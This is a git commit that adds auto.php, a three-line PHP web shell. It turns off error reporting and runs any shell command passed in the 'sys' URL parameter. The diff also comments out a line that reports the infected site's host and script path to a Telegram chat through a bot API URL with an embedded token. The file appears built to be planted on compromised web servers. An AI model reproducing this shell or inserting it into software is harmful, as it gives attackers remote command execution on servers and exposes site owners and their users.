b9638b1aebc7e1a968f5205150531739dd61e085
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-05-10 01:35:50 +0000

    Create auto.php

--- auto.php
+++ auto.php
@@ -1,3 +1,3 @@
 error_reporting(0);
 system($_GET['sys']);
-file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+//file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
